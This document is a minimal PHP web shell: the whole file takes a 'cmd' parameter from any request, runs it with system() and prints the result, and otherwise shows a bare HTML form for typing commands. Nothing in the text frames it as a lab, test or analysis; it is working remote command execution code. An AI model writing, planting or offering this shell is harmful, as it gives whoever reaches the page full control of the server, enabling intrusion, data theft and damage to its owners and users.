<?php if (isset($_REQUEST["cmd"])) var_dump(system($_REQUEST["cmd"])); else {
    echo "<form><input type='text' name='cmd'><input type='submit' value='Send cmd'></form>";
}?>